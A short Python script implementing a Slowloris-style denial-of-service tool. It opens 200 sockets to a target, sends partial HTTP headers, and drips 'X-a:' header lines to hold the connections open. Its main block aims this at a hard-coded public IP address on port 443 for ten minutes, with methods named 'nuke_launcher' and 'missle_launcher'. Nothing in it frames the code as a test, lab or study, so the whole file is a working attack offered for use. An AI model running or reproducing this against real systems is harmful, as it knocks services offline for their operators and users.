import socket
import time
import random
import sys


class tool():
    def __init__(self, ip, port=80, socketCount=200):
        self._ip = ip
        self._port = port
        self._headers = [
            "User-Agent: Mozilla/5.0 (Windows; U; \
                Windows NT 6.1; en-US; rv:1.9.1.5) \
                    Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
            "Accept-Language: en-us,en;q=0.5"
        ]
        self._sockets = [self.newSocket() for _ in range(socketCount)]

    def getMessage(self, message):
        return (message + "{} HTTP/1.1\r\n".format(str(
            random.randint(0, 2000)))).encode("utf-8")

    def newSocket(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4)
            s.connect((self._ip, self._port))
            for header in self._headers:
                s.send(bytes(bytes('{}\rn\n'.format(header).encode('utf-8'))))
            return s
        except socket.error as se:
            print('Error: ' + str(se))
            time.sleep(0.5)
            return self.newSocket()

    def nuke_launcher(self, timeout=sys.maxsize, sleep=15):
        t, i = time.time(), 0
        while(time.time() - t < timeout):
            for s in self._sockets:
                try:
                    print('Sending request #{}'.format(str(i)))
                    s.send(self.getMessage('X-a: '))
                    i += 1
                except socket.error:
                    self._sockets.remove(s)
                    self._sockets.append(self.newSocket())
                time.sleep(sleep/len(self._sockets))


if __name__ == '__main__':
    missle_launcher = tool('54.207.20.104', 443, socketCount=200)
    missle_launcher.nuke_launcher(timeout=60 * 10)
